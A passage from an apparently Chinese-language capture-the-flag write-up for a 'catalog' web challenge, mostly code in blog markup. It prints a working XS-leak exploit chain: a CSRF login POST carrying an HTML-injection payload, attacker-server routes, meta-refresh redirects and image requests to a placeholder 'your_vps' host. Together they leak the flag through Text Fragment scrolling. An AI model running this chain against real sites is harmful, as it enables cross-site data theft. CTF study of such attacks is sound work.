class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">const</span> next = <span class="hljs-keyword">async</span> () =&gt; {</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">let</span> res  = <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&quot;/status&quot;</span>);</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">let</span> status = <span class="hljs-keyword">await</span> res.text();</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-keyword">if</span> (status === <span class="hljs-string">&quot;true&quot;</span>) {</span></span><br><span class="line"><span class="hljs-javascript">                    <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&quot;http://catalog.pwni.ng/user.php&quot;</span>, {</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">&quot;headers&quot;</span>: {</span></span><br><span class="line"><span class="hljs-actionscript">                            <span class="hljs-string">&quot;content-type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,</span></span><br><span class="line">                        },</span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">                        &quot;body&quot;: `username=&quot;/&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://your_vps/injection&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;left&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://your_vps/exfiltrated&quot;</span> <span class="hljs-attr">loading</span>=<span class="hljs-string">&quot;lazy&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>&amp;password=1&amp;action=login`,</span></span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">&quot;mode&quot;</span>: <span class="hljs-string">&quot;no-cors&quot;</span>,</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">&quot;credentials&quot;</span>: <span class="hljs-string">&quot;include&quot;</span></span></span><br><span class="line">                    });</span><br><span class="line"><span class="hljs-javascript">                    <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&quot;/unlock&quot;</span>);</span></span><br><span class="line"><span class="hljs-actionscript">                } <span class="hljs-keyword">else</span> {</span></span><br><span class="line">                    next();</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            next();</span><br><span class="line">        <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://catalog.pwni.ng/issue.php?id=issue_id_1&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: absolute; width: 400%; height: 500px; border: 0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5176;&#x4E2D;<code>your_vps</code>&#x5904;&#x66FF;&#x6362;&#x4E3A;&#x4F60;&#x7684; vps &#x5730;&#x5740;&#xFF0C;issue_id_1 &#x66FF;&#x6362;&#x4E3A;&#x4E4B;&#x524D;&#x7684;&#x6570;&#x5B57; id</p></li><li><p>&#x968F;&#x4FBF; report &#x4E00;&#x4E2A; issue &#x7ED9; admin &#x5E76;&#x6293;&#x5305;&#x4FEE;&#x6539;&#x5185;&#x5BB9;&#xFF0C;&#x628A; id &#x5B57;&#x6BB5;&#x6539;&#x6210; issue_id_2 &#x5373;&#x53EF;&#x3002;</p><p></p><figure class="highlight ini hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">id</span>=<span class="hljs-number">19902</span>&amp;token=<span class="hljs-number">03</span>AGdBq26Abe5GL1dxt9c1N1n03hjoiUv1KCzn6o6VII3LGYY2JBKZLrVU5I7KxViJW8X87Nt_PJOFxyHpIFq_wq0Xph-SyP5dQTvu-s5k3AePCPKo8lMurhTM1V1Af_RdPImnBoGZb6Nm6YcilLNLeHLbGbDj7XPFCHqjdSq1zyJA7Luam8SlPzgPJOOPJYz65fXRPtn0GVunipJNjiXbXtvPKTJjPVat784uRrCQ47aHuWXnxyipstDGkZj0-iujm9k-L51EUDv9FbW4kEULU0_nDwVgtIc5ZniVcIVgupcpfGAagCLMyKGfDsFho9U4BHsdqsc7918PN<span class="hljs-literal">yeS</span>rcbPN7gmq_aLJRTGx6bICHnzHzaKNB5yakec0YsC1CQzLhtqqZhTQvEJNREkXvBHZ7PlYXdypNCNSCwI_g</span><br></pre></td></tr></tbody></table></figure><p></p><p>token &#x662F; Google &#x9A8C;&#x8BC1;&#x7801;&#x7528;&#x4E8E;&#x9A8C;&#x8BC1;&#x7684; token &#xFF0C;&#x8FD9;&#x4E2A; token &#x4F60;&#x53EF;&#x4EE5;&#x53E6;&#x5F00;&#x4E00;&#x4E2A;&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x6253;&#x5F00;&#x63A7;&#x5236;&#x53F0;&#x8F93;&#x5165;&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#xFF08;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x53EF;&#x4EE5;&#x5728;&#x9898;&#x76EE; main.js &#x62FF;&#x5230;&#xFF09;&#x5373;&#x53EF;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grecaptcha.ready(<span class="hljs-keyword">async</span> () =&gt; {</span><br><span class="line">    <span class="hljs-keyword">let</span> token = <span class="hljs-keyword">await</span> grecaptcha.execute(<span class="hljs-string">&quot;6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y&quot;</span>, {</span><br><span class="line">        action: <span class="hljs-string">&quot;report&quot;</span></span><br><span class="line">    });</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(token);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>&#x5982;&#x679C; vps &#x6536;&#x5230;&#x4E86; match &#xFF0C;&#x5C31;&#x5728;&#x8BE5;&#x8303;&#x56F4;&#x7EE7;&#x7EED;&#x4E8C;&#x5206;&#xFF0C;&#x4E0D;&#x7136;&#x5C31;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x8303;&#x56F4;&#x7EE7;&#x7EED;&#x4E8C;&#x5206;&#xFF0C;&#x91CD;&#x590D;1-4&#x6B65;&#x9AA4;&#x5373;&#x53EF;</p></li></ol><h3 id="Detailed-Attack-Chain"><a href="#Detailed-Attack-Chain" class="headerlink" title="Detailed Attack Chain"></a>Detailed Attack Chain</h3><p>&#x597D;&#x4E86;&#xFF0C;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5C31;&#x6765;&#x6574;&#x7406;&#x4E00;&#x4E0B;&#x5168;&#x90E8;&#x4FE1;&#x606F;&#xFF0C;&#x4EE5;&#x53CA;&#x8BF4;&#x4E00;&#x4E0B;&#x8BE6;&#x7EC6;&#x7684;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#xFF1A;</p><ol><li><p>&#x9996;&#x5148; admin &#x4F1A;&#x70B9;&#x51FB;&#x6211;&#x4EEC;&#x63D0;&#x4EA4;&#x7684;&#x7B2C;&#x4E8C;&#x4E2A; issue &#xFF0C;&#x7136;&#x540E;&#x56E0;&#x4E3A;&#x7B2C;&#x4E8C;&#x4E2A; issue_2 &#x5185;&#x5BB9;&#x5B58;&#x5728;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;0;URL=&apos;http://your_vps/&apos;&quot;</span>&gt;</span>&quot;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F1A;&#x8DF3;&#x8F6C;&#x5230;&#x6211;&#x4EEC; vps &#x4E3B;&#x9875;&#x9762;</p></li><li><p>&#x8FD9;&#x65F6; admin &#x4F1A;&#x52A0;&#x8F7D; index.html &#xFF0C;&#x6B64;&#x65F6; iframe &#x4F1A;&#x8BF7;&#x6C42;&#x7B2C;&#x4E00;&#x4E2A; issue_1 &#x9875;&#x9762;&#xFF0C;&#x5E76;&#x4E14;&#x53D1;&#x9001;&#x8BF7;&#x6C42; <a href="http://your_vps/status" target="_blank" rel="noopener">http://your_vps/status</a> &#xFF0C;&#x6700;&#x521D;&#x59CB;&#x5316;&#x7684;&#x65F6;&#x5019;&#x56E0;&#x4E3A;<code>let status = false;</code>&#xFF0C;&#x800C; js &#x8FD8;&#x6709;&#x4E00;&#x4E2A; status &#x7684;&#x5224;&#x65AD;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> status = <span class="hljs-keyword">await</span> res.text();</span><br><span class="line"><span class="hljs-keyword">if</span> (status === <span class="hljs-string">&quot;true&quot;</span>) {</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5; script &#x91CC;&#x9762;&#x7684;&#x6D41;&#x7A0B;&#x4F1A;&#x4E00;&#x76F4;&#x7B49;&#x5F85;<code>status</code>&#x7684;&#x53D8;&#x5316;&#xFF0C;&#x5B9E;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x7C7B;&#x4F3C;&#x4E8E;&#x9501;&#x4E00;&#x6837;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x5C31;&#x79F0;&#x4E3A; status &#x9501;&#xFF0C;&#x800C;&#x89E3;&#x9501;&#x8FD9;&#x4E2A;&#x9501;&#x7684;&#x6761;&#x4EF6;&#x5C31;&#x662F;&#x5F53; iframe &#x91CC;&#x9762;&#x7684; issue_1 &#x5B8C;&#x5168;&#x52A0;&#x8F7D;&#x5B8C;&#x6BD5;&#x3002;</p><p>&#x5F53; iframe &#x4E2D;&#x7684; issue_1 &#x5B8C;&#x5168;&#x52A0;&#x8F7D;&#x5B8C;&#x6BD5;&#xFF0C;&#x6B64;&#x65F6; issue_1 &#x754C;&#x9762;&#x91CC;&#x9762;&#x8FD8;&#x6709;&#x4E00;&#x4E2A; img &#x6807;&#x7B7E;&#x7528;&#x4E8E;&#x89E3;&#x9501; status &#x9501;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://your_vps/fragment&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span>+<span class="hljs-attr">content</span>=<span class="hljs-string">&quot;0;URL=&apos;http://catalog.pwni.ng/issue.php?id=3#...&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6;&#x4F1A;&#x8BF7;&#x6C42;&#x6211;&#x4EEC; <a href="http://your_vps/fragment" target="_blank" rel="noopener">http://your_vps/fragment</a> </p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">&quot;/fragment&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    status = <span class="hljs-literal">true</span>;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; Admin was fragmented&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">let</span> timer = setInterval(<span class="hljs-keyword">async</span> () =&gt; {</span><br><span class="line">        <span class="hljs-keyword">if</span> (unlock) {</span><br><span class="line">            res.send(<span class="hljs-string">&quot;fragment&quot;</span>);</span><br><span class="line">            clearInterval(timer);</span><br><span class="line">        }</span><br><span class="line">    }, <span class="hljs-number">1</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8BE5;&#x8DEF;&#x7531;&#x89E3;&#x9501;&#x4E86; status &#x9501;&#xFF0C;&#x5E76;&#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x8BA1;&#x65F6;&#x5668;&#x7B49;&#x5F85; unlock &#x6765;&#x89E3;&#x9664;&#xFF0C;&#x6211;&#x4EEC;&#x79F0;&#x4E3A; fragment &#x9501;&#xFF0C;&#x8868;&#x793A; admin &#x5DF2;&#x7ECF;&#x52A0;&#x8F7D;&#x4E86; iframe &#x3002;</p></li><li><p>&#x8FD9;&#x662F;&#x56E0;&#x4E3A; fragment &#x9501;&#x7684;&#x539F;&#x56E0;&#xFF0C;iframe &#x5F53;&#x4E2D;&#x7684;&#x9875;&#x9762;&#x7B49;&#x5F85;&#x5728; issue_1 &#x754C;&#x9762;&#x7B49;&#x5F85; fragment &#x9501;&#x7684;&#x89E3;&#x9501;&#xFF0C;&#x800C;&#x5F53; status &#x9501;&#x89E3;&#x9501;&#xFF0C;&#x4F1A;&#x7ACB;&#x9A6C;&#x89E6;&#x53D1; index.html &#x5F53;&#x4E2D;&#x7684; fetch &#x8BF7;&#x6C42;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&quot;http://catalog.pwni.ng/user.php&quot;</span>, {</span><br><span class="line">  <span class="hljs-string">&quot;headers&quot;</span>: {</span><br><span class="line">  <span class="hljs-string">&quot;content-type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">  },</span><br><span class="line">  <span class="hljs-string">&quot;body&quot;</span>: <span class="hljs-string">`username=&quot;/&gt;&lt;img src=&quot;http://your_vps/injection&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div align=&quot;left&quot;&gt;&lt;img src=&quot;http://your_vps/exfiltrated&quot; loading=&quot;lazy&quot;&gt;&lt;/div&gt;&lt;em&gt;&amp;password=1&amp;action=login`</span>,</span><br><span class="line">  <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;POST&quot;</span>,</span><br><span class="line">  <span class="hljs-string">&quot;mode&quot;</span>: <span class="hljs-string">&quot;no-cors&quot;</span>,</span><br><span class="line">  <span class="hljs-string">&quot;credentials&quot;</span>: <span class="hljs-string">&quot;include&quot;</span></span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x65F6;&#x56E0;&#x4E3A;&#x8FD8;&#x662F; admin &#x7684; session &#xFF0C;&#x6240;&#x4EE5; admin session &#x5B58;&#x50A8;&#x7684; HTML &#x5143;&#x7D20;&#x4F1A;&#x53D8;&#x6210;&#x6211;&#x4EEC;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684; HTML &#x5143;&#x7D20;</p></li><li><p>&#x63A5;&#x7740; index.html &#x6267;&#x884C;<code>await fetch(&quot;/unlock&quot;);</code>&#xFF0C;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">&quot;/unlock&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    unlock = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">&quot;unlock&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>unlock &#x8DEF;&#x7531;&#x5C06; unlock &#x7F6E;&#x4E3A; true&#xFF0C;&#x6E05;&#x9664;&#x4E86; fragment &#x8DEF;&#x7531;&#x5F53;&#x4E2D;&#x7684;&#x8BA1;&#x65F6;&#x5668;&#xFF0C;&#x89E3;&#x9501; fragment &#x9501;&#xFF0C;&#x6B64;&#x65F6; iframe &#x5F53;&#x4E2D;&#x7684; issue_1 &#x754C;&#x9762;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x5168;&#x90E8;&#x52A0;&#x8F7D;&#xFF0C;&#x5E76;&#x56E0;&#x4E3A;<code>&lt;meta&gt;</code>&#x6807;&#x7B7E;&#x7684;&#x4F5C;&#x7528;&#x8DF3;&#x8F6C;&#x5230;&#x4E86;&#x5305;&#x542B;&#x6709; FLAG &#x5E76;&#x4E14;&#x6709; Text Fragemnt &#x529F;&#x80FD;&#x7684;&#x9875;&#x9762;</p></li><li><p>&#x6B64;&#x65F6; FLAG &#x9875;&#x9762;&#x8FD8;&#x662F; admin session &#x7684;&#x5173;&#x7CFB;&#xFF0C;&#x4F1A;&#x8BFB;&#x53D6;&#x4E0A;&#x4E00;&#x8F6E;&#x6211;&#x4EEC;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684; HTML &#x5143;&#x7D20;&#x4E5F;&#x5C31;&#x662F;&#x6CE8;&#x5165;&#x4E86;&#x5F88;&#x591A;<code>&lt;br&gt;</code>&#x6807;&#x7B7E;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5B8C;&#x6210;&#x4E86;&#x5C06; FLAG &#x6324;&#x51FA;&#x7528;&#x6237;&#x89C6;&#x7A97;&#x754C;&#x9762;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x7531;&#x4E8E; uBlock &#x4F20;&#x9012;&#x4E86; User Activation &#x6FC0;&#x6D3B;&#x4E86; Text Fragment &#x529F;&#x80FD;&#xFF0C;&#x5C06;&#x4F1A;&#x5728;&#x9875;&#x9762;&#x8FDB;&#x884C;&#x5339;&#x914D; FLAG &#x5B57;&#x7B26;</p></li><li><p>&#x4E00;&#x52A0;&#x8F7D;&#x5B8C;&#x754C;&#x9762;&#x9996;&#x5148;&#x4F1A;&#x56E0;&#x4E3A;<code>&lt;img src=&quot;http://your_vps/injection&quot;&gt;</code>&#xFF0C;&#x8BF7;&#x6C42;&#x5230; injection &#x8DEF;&#x7531;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">&quot;/injection&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; HTML injection was inserted into id=3 catalog&quot;</span>);</span><br><span class="line">    setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">if</span> (match) <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; There was a match&quot;</span>);</span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; There wasn&apos;t a match&quot;</span>);</span><br><span class="line">        match = <span class="hljs-literal">false</span>;</span><br><span class="line">        unlock = <span class="hljs-literal">false</span>;</span><br><span class="line">        status = <span class="hljs-literal">false</span>;</span><br><span class="line">    }, <span class="hljs-number">1000</span>);</span><br><span class="line">    res.send(<span class="hljs-string">&quot;injection&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6;&#x4F1A;&#x6709;&#x4E00;&#x4E2A; 1s &#x5EF6;&#x65F6;&#x7B49;&#x5F85;&#xFF0C;&#x8FD9;&#x4E2A;&#x7B49;&#x5F85;&#x5C31;&#x662F;&#x4E3A;&#x4E86;&#x7B49;&#x5F85; Text Fragments &#x662F;&#x5426;&#x5339;&#x914D;&#x5230; FLAG&#x7684;&#x5224;&#x65AD;</p></li><li><p>&#x5982;&#x679C; Text Fragments &#x5339;&#x914D;&#x5230;&#x4E86;&#xFF0C;&#x5C31;&#x4F1A;&#x89E6;&#x53D1;&#x6EDA;&#x52A8;&#xFF0C;&#x7528;&#x6237;&#x89C6;&#x7A97;&#x6EDA;&#x52A8;&#x5230; FLAG 